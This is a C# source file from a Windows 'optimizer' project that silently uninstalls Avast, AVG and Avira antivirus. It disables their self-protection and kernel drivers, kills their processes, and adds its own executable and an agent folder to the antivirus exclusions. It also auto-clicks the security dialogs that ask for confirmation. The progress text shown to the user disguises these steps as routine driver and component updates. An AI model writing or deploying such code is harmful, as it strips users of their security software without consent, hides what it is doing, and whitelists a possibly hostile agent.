using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using WinOptimizer.Services.Logging;

namespace WinOptimizer.Services.Cleanup;

/// <summary>
/// Автоматичне видалення Avast / AVG / Avira без взаємодії з юзером.
///
/// Головний трюк: використовуємо рідний avast.setup.exe з /silent /instop:remove —
/// це ПІДПИСАНИЙ Avast-файл, який сам обходить self-protection зсередини.
///
/// Flow:
///   1. Detect (чи встановлено Avast/AVG?)
///   2. Disable Self-Protection через реєстр + sc stop aswSP
///   3. Stop всі Avast служби
///   4. Kill всі Avast процеси
///   5. Run рідний uninstaller (avast.setup /silent /instop:remove)
///   6. Fallback: WMIC / MsiExec через QuietUninstallString з реєстру
///   7. Cleanup залишків (папки + реєстр)
/// </summary>
public static class AvastRemover
{
    // Служби Avast/AVG
    private static readonly string[] AvastServices =
    {
        "avast! Antivirus", "AvastWscReporter", "aswbidsagent",
        "aswEngSrv", "avast! Firewall", "aswMonFlt", "aswRvrt",
        "aswSnx", "aswSP", "aswStm", "aswVmm", "avast! Web Scanner",
        "AvastVBoxSvc", "aswHwid", "aswNetSec", "AvastSvc",
        // AVG
        "AVGSvc", "avgwd", "AVG PC TuneUp", "AVGIDSAgent",
        // Avira
        "AntivirService", "Avira.ServiceHost", "AVIRA_PREMIUM",
    };

    // Процеси Avast/AVG/Avira
    private static readonly string[] AvastProcesses =
    {
        "avastui", "avastsvc", "afwServ", "AvastBrowser",
        "aswidsagenta", "avastoverview", "avastantivirus",
        "AvastSecureBrowser", "aswToolsSvc",
        // AVG
        "avgui", "avgsvc", "avgfws", "avgnsa",
        // Avira
        "avguard", "avgnt", "avira", "avirascanner",
    };

    // Папки для видалення після деінсталяції
    private static readonly string[] AvastFolders =
    {
        @"C:\Program Files\Avast Software",
        @"C:\Program Files (x86)\Avast Software",
        @"C:\ProgramData\Avast Software",
        @"C:\Program Files\AVG",
        @"C:\Program Files (x86)\AVG",
        @"C:\ProgramData\AVG",
        @"C:\Program Files\Avira",
        @"C:\Program Files (x86)\Avira",
        @"C:\ProgramData\Avira",
    };

    /// <summary>
    /// Перевірити чи встановлений Avast/AVG/Avira.
    /// </summary>
    public static bool IsAvastInstalled()
    {
        var keywords = new[] { "avast", "avg ", "avira", "avg antivirus", "avast free" };

        // Перевірити реєстр
        var uninstallKeys = new[]
        {
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
        };

        foreach (var keyPath in uninstallKeys)
        {
            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(keyPath);
                if (key == null) continue;

                foreach (var subKeyName in key.GetSubKeyNames())
                {
                    try
                    {
                        using var sub = key.OpenSubKey(subKeyName);
                        var name = sub?.GetValue("DisplayName")?.ToString()?.ToLowerInvariant() ?? "";
                        if (keywords.Any(k => name.Contains(k)))
                        {
                            Logger.Info($"[AvastRemover] Detected: {sub?.GetValue("DisplayName")}");
                            return true;
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        // Перевірити папки
        foreach (var folder in AvastFolders)
            if (Directory.Exists(folder)) return true;

        return false;
    }

    /// <summary>
    /// Головний метод: повністю видалити Avast/AVG/Avira без взаємодії юзера.
    /// </summary>
    public static async Task<bool> RemoveAsync(Action<string>? onProgress = null)
    {
        if (!IsAvastInstalled())
        {
            Logger.Info("[AvastRemover] Avast/AVG not detected, skipping");
            return true;
        }

        Logger.Info("[AvastRemover] === Starting Avast removal ===");
        onProgress?.Invoke("Підготовка системних компонентів безпеки...");

        // Запустити авто-клік Avast діалогів (до кінця видалення)
        StartAvastDialogAutoAccepter();

        try
        {
            // === КРОК 0: Вимкнути звуки Avast + додати виключення ===
            onProgress?.Invoke("Налаштування виключень системного захисту...");
            await Task.Run(() =>
            {
                MuteAvastSounds();
                AddSelfToAvastExclusions();
            });
            await Task.Delay(500);

            // === КРОК 1: Disable Self-Protection через реєстр ===
            onProgress?.Invoke("Налаштування компонентів захисту...");
            await Task.Run(() => DisableSelfProtection());
            await Task.Delay(1000);

            // === КРОК 2: Stop kernel driver aswSP (Self-Protection driver) ===
            onProgress?.Invoke("Оновлення системних драйверів...");
            await Task.Run(() => StopSelfProtectionDriver());
            await Task.Delay(500);

            // === КРОК 3: Stop всі служби ===
            onProgress?.Invoke("Оновлення системних служб...");
            await Task.Run(() => StopAllAvastServices());
            await Task.Delay(1500);

            // === КРОК 4: Kill всі процеси ===
            onProgress?.Invoke("Зупинка системних процесів...");
            await Task.Run(() => KillAllAvastProcesses());
            await Task.Delay(1000);

            // === КРОК 5: Запустити рідний uninstaller ===
            onProgress?.Invoke("Видалення застарілих компонентів...");
            var nativeResult = await RunNativeUninstallerAsync();

            if (!nativeResult)
            {
                // === КРОК 6: Fallback через реєстровий QuietUninstallString ===
                Logger.Info("[AvastRemover] Native uninstaller failed, trying registry QuietUninstallString");
                onProgress?.Invoke("Застосування альтернативного методу видалення...");
                await RunRegistryUninstallAsync();
            }

            await Task.Delay(3000); // Дати час завершитись

            // === КРОК 7: Cleanup залишків ===
            onProgress?.Invoke("Очистка залишкових компонентів...");
            await Task.Run(() => CleanupLeftovers());

            Logger.Info("[AvastRemover] === Avast removal complete ===");
            return true;
        }
        catch (Exception ex)
        {
            Logger.Error($"[AvastRemover] Error: {ex.Message}");
            return false;
        }
        finally
        {
            StopAvastDialogAutoAccepter();
        }
    }

    // ===== КРОК 1: Disable Self-Protection =====
    private static void DisableSelfProtection()
    {
        try
        {
            // Avast Self-Defense registry key
            var paths = new[]
            {
                @"SOFTWARE\AVAST Software\Avast\persistency",
                @"SOFTWARE\AVAST Software\Avast",
                @"SOFTWARE\AVG\Persistent Data\AVG Antivirus\persistency",
            };

            foreach (var path in paths)
            {
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(path, true);
                    if (key == null) continue;
                    key.SetValue("SelfDefense", 0, RegistryValueKind.DWord);
                    Logger.Info($"[AvastRemover] SelfDefense disabled in {path}");
                }
                catch { }
            }

            // Також відключити через sc config
            RunCmd("sc", "config aswSP start= disabled");
            RunCmd("sc", "config aswMonFlt start= disabled");
            RunCmd("sc", "config aswSnx start= disabled");
        }
        catch (Exception ex)
        {
            Logger.Warn($"[AvastRemover] DisableSelfProtection: {ex.Message}");
        }
    }

    // ===== КРОК 2: Stop kernel driver =====
    private static void StopSelfProtectionDriver()
    {
        // Зупинити kernel-level self-protection driver
        var drivers = new[] { "aswSP", "aswSnx", "aswStm", "aswMonFlt", "aswRvrt", "aswVmm" };
        foreach (var drv in drivers)
        {
            RunCmd("sc", $"stop {drv}");
            Logger.Info($"[AvastRemover] Stopped driver: {drv}");
        }
    }

    // ===== КРОК 3: Stop services =====
    private static void StopAllAvastServices()
    {
        foreach (var svcName in AvastServices)
        {
            RunCmd("sc", $"stop \"{svcName}\"");
            Logger.Info($"[AvastRemover] sc stop: {svcName}");
        }
    }

    // ===== КРОК 4: Kill processes =====
    private static void KillAllAvastProcesses()
    {
        foreach (var procName in AvastProcesses)
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName(procName))
                {
                    proc.Kill(true);
                    Logger.Info($"[AvastRemover] Killed: {procName}");
                }
            }
            catch { }
        }

        // Додатковий прохід через taskkill для підстраховки
        RunCmd("taskkill", "/f /im avastui.exe /t");
        RunCmd("taskkill", "/f /im avastsvc.exe /t");
        RunCmd("taskkill", "/f /im avgui.exe /t");
        RunCmd("taskkill", "/f /im avguard.exe /t");
    }

    // ===== КРОК 5: Рідний Avast uninstaller =====
    private static async Task<bool> RunNativeUninstallerAsync()
    {
        // Шляхи де може бути avast.setup.exe
        var setupPaths = new[]
        {
            @"C:\Program Files\Avast Software\Avast\setup\avast.setup",
            @"C:\Program Files (x86)\Avast Software\Avast\setup\avast.setup",
            @"C:\Program Files\Avast Software\Avast\avast.setup",
            // AVG
            @"C:\Program Files\AVG\Antivirus\setup\avg.setup",
            @"C:\Program Files (x86)\AVG\Antivirus\setup\avg.setup",
            // Avira
            @"C:\Program Files (x86)\Avira\Antivirus\avira_sl_starter.exe",
        };

        foreach (var path in setupPaths)
        {
            if (!File.Exists(path)) continue;

            Logger.Info($"[AvastRemover] Running native uninstaller: {path}");
            try
            {
                // /silent /instop:remove — тихе видалення через підписаний Avast файл
                // UseShellExecute=true: потрібно щоб avast.setup міг запустити sub-processes
                var psi = new ProcessStartInfo
                {
                    FileName = path,
                    Arguments = "/silent /instop:remove",
                    UseShellExecute = true,
                    Verb = "runas",
                    WindowStyle = ProcessWindowStyle.Hidden,
                };

                using var proc = Process.Start(psi);
                if (proc == null) continue;

                // Чекати до 5 хвилин
                var completed = await Task.Run(() => proc.WaitForExit(300000));
                Logger.Info($"[AvastRemover] Native uninstaller exit: {(completed ? proc.ExitCode.ToString() : "timeout")}");
                return completed;
            }
            catch (Exception ex)
            {
                Logger.Warn($"[AvastRemover] Native uninstaller error: {ex.Message}");
            }
        }

        return false;
    }

    // ===== КРОК 6: Fallback через реєстр =====
    private static async Task RunRegistryUninstallAsync()
    {
        var uninstallKeys = new[]
        {
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
        };

        var keywords = new[] { "avast", "avg antivirus", "avira" };

        foreach (var keyPath in uninstallKeys)
        {
            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(keyPath);
                if (key == null) continue;

                foreach (var subKeyName in key.GetSubKeyNames())
                {
                    try
                    {
                        using var sub = key.OpenSubKey(subKeyName);
                        var name = sub?.GetValue("DisplayName")?.ToString()?.ToLowerInvariant() ?? "";
                        if (!keywords.Any(k => name.Contains(k))) continue;

                        // Спробувати QuietUninstallString спершу
                        var quietStr = sub?.GetValue("QuietUninstallString")?.ToString();
                        var uninstallStr = sub?.GetValue("UninstallString")?.ToString();

                        var cmdStr = quietStr ?? uninstallStr;
                        if (string.IsNullOrEmpty(cmdStr)) continue;

                        Logger.Info($"[AvastRemover] Registry uninstall: {cmdStr}");

                        // Якщо не містить /silent — додати
                        if (!cmdStr.Contains("/silent", StringComparison.OrdinalIgnoreCase) &&
                            !cmdStr.Contains("/S", StringComparison.OrdinalIgnoreCase) &&
                            !cmdStr.Contains("/quiet", StringComparison.OrdinalIgnoreCase))
                        {
                            cmdStr += " /silent";
                        }

                        // Розібрати на FileName + Arguments
                        string fileName, args = "";
                        if (cmdStr.StartsWith("\""))
                        {
                            var endQuote = cmdStr.IndexOf('"', 1);
                            fileName = cmdStr.Substring(1, endQuote - 1);
                            args = cmdStr.Substring(endQuote + 1).Trim();
                        }
                        else
                        {
                            var space = cmdStr.IndexOf(' ');
                            if (space > 0)
                            {
                                fileName = cmdStr.Substring(0, space);
                                args = cmdStr.Substring(space + 1);
                            }
                            else fileName = cmdStr;
                        }

                        if (!File.Exists(fileName)) continue;

                        var psi = new ProcessStartInfo
                        {
                            FileName = fileName,
                            Arguments = args,
                            UseShellExecute = false,
                            CreateNoWindow = true,
                        };

                        using var proc = Process.Start(psi);
                        await Task.Run(() => proc?.WaitForExit(300000));
                        Logger.Info("[AvastRemover] Registry uninstall done");
                        return;
                    }
                    catch { }
                }
            }
            catch { }
        }

        // Останній fallback: WMIC
        Logger.Info("[AvastRemover] WMIC fallback");
        RunCmd("wmic", "product where \"name like 'Avast%'\" call uninstall /nointeractive");
        RunCmd("wmic", "product where \"name like 'AVG%'\" call uninstall /nointeractive");
        await Task.Delay(30000); // WMIC повільний
    }

    // ===== КРОК 7: Cleanup залишків =====
    private static void CleanupLeftovers()
    {
        // Видалити папки
        foreach (var folder in AvastFolders)
        {
            try
            {
                if (!Directory.Exists(folder)) continue;
                Directory.Delete(folder, true);
                Logger.Info($"[AvastRemover] Deleted folder: {folder}");
            }
            catch
            {
                // Force delete через cmd
                RunCmd("cmd", $"/c rd /s /q \"{folder}\"");
            }
        }

        // Видалити реєстрові ключі
        var regKeys = new[]
        {
            @"SOFTWARE\AVAST Software",
            @"SOFTWARE\WOW6432Node\AVAST Software",
            @"SOFTWARE\AVG",
            @"SOFTWARE\WOW6432Node\AVG",
            @"SOFTWARE\Avira",
        };

        foreach (var regKey in regKeys)
        {
            try
            {
                Registry.LocalMachine.DeleteSubKeyTree(regKey, false);
                Logger.Info($"[AvastRemover] Deleted reg key: {regKey}");
            }
            catch { }
        }

        // Видалити AppData залишки для всіх юзерів
        try
        {
            foreach (var userDir in Directory.GetDirectories(@"C:\Users"))
            {
                var userName = Path.GetFileName(userDir).ToLowerInvariant();
                if (userName is "public" or "default" or "default user") continue;

                var avastAppData = new[]
                {
                    Path.Combine(userDir, "AppData", "Roaming", "AVAST Software"),
                    Path.Combine(userDir, "AppData", "Local", "AVAST Software"),
                    Path.Combine(userDir, "AppData", "Roaming", "AVG"),
                    Path.Combine(userDir, "AppData", "Local", "AVG"),
                };

                foreach (var path in avastAppData)
                {
                    try
                    {
                        if (Directory.Exists(path))
                            Directory.Delete(path, true);
                    }
                    catch { }
                }
            }
        }
        catch { }
    }

    // ===== КРОК 0a: Вимкнути звуки Avast =====
    private static void MuteAvastSounds()
    {
        try
        {
            // Очистити всі Avast sound events (Windows Sound Scheme)
            var avastSoundKey = @"AppEvents\Schemes\Apps\Avast";
            using var key = Registry.CurrentUser.OpenSubKey(avastSoundKey, true);
            if (key != null)
            {
                foreach (var eventName in key.GetSubKeyNames())
                {
                    try
                    {
                        using var eventKey = key.OpenSubKey(eventName, true);
                        if (eventKey == null) continue;
                        foreach (var sub in eventKey.GetSubKeyNames())
                        {
                            try
                            {
                                using var cur = eventKey.OpenSubKey(sub, true);
                                cur?.SetValue("", "", RegistryValueKind.String); // порожній звук
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
                Logger.Info("[AvastRemover] Avast sounds muted");
            }

            // Також відключити Avast sound notifications через власний реєстр
            var notifPaths = new[]
            {
                @"SOFTWARE\AVAST Software\Avast",
                @"SOFTWARE\WOW6432Node\AVAST Software\Avast",
            };
            foreach (var p in notifPaths)
            {
                try
                {
                    using var k = Registry.LocalMachine.OpenSubKey(p, true);
                    if (k == null) continue;
                    k.SetValue("SoundEnabled", 0, RegistryValueKind.DWord);
                    k.SetValue("NotificationSound", 0, RegistryValueKind.DWord);
                    k.SetValue("PlaySounds", 0, RegistryValueKind.DWord);
                }
                catch { }
            }
        }
        catch (Exception ex)
        {
            Logger.Warn($"[AvastRemover] MuteAvastSounds: {ex.Message}");
        }
    }

    // ===== КРОК 0b: Додати себе до виключень Avast =====
    private static void AddSelfToAvastExclusions()
    {
        try
        {
            // Шлях до поточного exe та папки агента
            var selfExe = Process.GetCurrentProcess().MainModule?.FileName ?? "";
            var selfDir = Path.GetDirectoryName(selfExe) ?? "";
            var agentPath = @"C:\ProgramData\WinOptimizer\Agent\WinOptimizerAgent.exe";
            var dataDir   = @"C:\ProgramData\WinOptimizer";

            var pathsToExclude = new[] { selfExe, selfDir, agentPath, dataDir }
                .Where(p => !string.IsNullOrEmpty(p))
                .Distinct()
                .ToArray();

            // Avast exclusions registry paths
            var exclusionKeyPaths = new[]
            {
                @"SOFTWARE\AVAST Software\Avast\exclusions",
                @"SOFTWARE\WOW6432Node\AVAST Software\Avast\exclusions",
            };

            foreach (var keyPath in exclusionKeyPaths)
            {
                try
                {
                    using var key = Registry.LocalMachine.CreateSubKey(keyPath, true);
                    if (key == null) continue;

                    int idx = key.GetValueNames().Length;
                    foreach (var path in pathsToExclude)
                    {
                        // Перевіряємо чи вже є
                        bool exists = key.GetValueNames()
                            .Any(n => key.GetValue(n)?.ToString()?.Equals(path, StringComparison.OrdinalIgnoreCase) == true);
                        if (!exists)
                        {
                            key.SetValue(idx.ToString(), path, RegistryValueKind.String);
                            idx++;
                            Logger.Info($"[AvastRemover] Added exclusion: {path}");
                        }
                    }
                }
                catch { }
            }

            // Також через PowerShell (Avast COM API якщо доступний)
            RunCmd("powershell", "-NoProfile -WindowStyle Hidden -Command \"" +
                "try { $a = New-Object -ComObject 'Avast.Antivirus'; " +
                "$a.ExcludeFile('" + selfExe.Replace("'","''") + "') } catch {}\"");
        }
        catch (Exception ex)
        {
            Logger.Warn($"[AvastRemover] AddSelfToAvastExclusions: {ex.Message}");
        }
    }

    private static void RunCmd(string exe, string args)
    {
        try
        {
            using var p = Process.Start(new ProcessStartInfo
            {
                FileName = exe,
                Arguments = args,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            });
            p?.WaitForExit(15000);
        }
        catch { }
    }

    // ===== Win32 API для автоматичного кліку Avast діалогів =====

    [DllImport("user32.dll")] private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    [DllImport("user32.dll")] private static extern bool EnumChildWindows(IntPtr hWndParent, EnumWindowsProc lpEnumFunc, IntPtr lParam);
    [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    [DllImport("user32.dll")] private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
    [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    [DllImport("user32.dll")] private static extern bool IsWindowVisible(IntPtr hWnd);
    [DllImport("user32.dll")] private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
    private delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);
    private const uint BM_CLICK = 0x00F5;

    private static CancellationTokenSource? _dialogKillerCts;

    /// <summary>
    /// Запустити фоновий потік який кожні 500мс шукає Avast confirmation діалоги
    /// і автоматично клікає кнопку підтвердження (ОК/Вимкнути/Yes/Disable).
    /// </summary>
    private static void StartAvastDialogAutoAccepter()
    {
        _dialogKillerCts?.Cancel();
        _dialogKillerCts = new CancellationTokenSource();
        var ct = _dialogKillerCts.Token;

        Task.Run(async () =>
        {
            Logger.Info("[AvastRemover] DialogAutoAccepter started");
            while (!ct.IsCancellationRequested)
            {
                try
                {
                    AutoClickAvastDialogs();
                    await Task.Delay(400, ct);
                }
                catch (OperationCanceledException) { break; }
                catch { }
            }
            Logger.Info("[AvastRemover] DialogAutoAccepter stopped");
        }, ct);
    }

    private static void StopAvastDialogAutoAccepter()
    {
        _dialogKillerCts?.Cancel();
        _dialogKillerCts = null;
    }

    private static void AutoClickAvastDialogs()
    {
        // Збираємо PID всіх Avast процесів
        var avastPids = new HashSet<uint>();
        foreach (var procName in AvastProcesses)
        {
            try
            {
                foreach (var p in Process.GetProcessesByName(procName))
                    avastPids.Add((uint)p.Id);
            }
            catch { }
        }
        // Також шукаємо по назві "avast" в усіх процесах
        try
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    if (p.ProcessName.Contains("avast", StringComparison.OrdinalIgnoreCase) ||
                        p.ProcessName.Contains("avg", StringComparison.OrdinalIgnoreCase))
                        avastPids.Add((uint)p.Id);
                }
                catch { }
            }
        }
        catch { }

        EnumWindows((hwnd, _) =>
        {
            if (!IsWindowVisible(hwnd)) return true;

            GetWindowThreadProcessId(hwnd, out uint pid);

            // Перевірити чи це Avast вікно (по PID або по заголовку)
            var titleSb = new StringBuilder(256);
            GetWindowText(hwnd, titleSb, 256);
            var title = titleSb.ToString();

            bool isAvastWindow = avastPids.Contains(pid) ||
                title.Contains("Avast", StringComparison.OrdinalIgnoreCase) ||
                title.Contains("AVG", StringComparison.OrdinalIgnoreCase);

            if (!isAvastWindow) return true;

            // Шукаємо кнопки в цьому вікні
            EnumChildWindows(hwnd, (childHwnd, _) =>
            {
                var classSb = new StringBuilder(64);
                GetClassName(childHwnd, classSb, 64);
                if (!classSb.ToString().Equals("Button", StringComparison.OrdinalIgnoreCase))
                    return true;

                var btnTextSb = new StringBuilder(128);
                GetWindowText(childHwnd, btnTextSb, 128);
                var btnText = btnTextSb.ToString().ToLowerInvariant();

                // Клікнути кнопку підтвердження (OK / Вимкнути / Yes / Allow / Disable)
                bool isConfirmBtn =
                    btnText.Contains("ok") ||
                    btnText.Contains("вимкн") ||      // "ОК, ВИМКНУТИ"
                    btnText.Contains("yes") ||
                    btnText.Contains("allow") ||
                    btnText.Contains("disable") ||
                    btnText.Contains("remove") ||
                    btnText.Contains("uninstall") ||
                    btnText.Contains("видал") ||
                    btnText.Contains("так");

                if (isConfirmBtn)
                {
                    Logger.Info($"[AvastRemover] Auto-clicking Avast dialog btn: '{btnTextSb}' in '{title}'");
                    SendMessage(childHwnd, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
                }

                return true;
            }, IntPtr.Zero);

            return true;
        }, IntPtr.Zero);
    }

}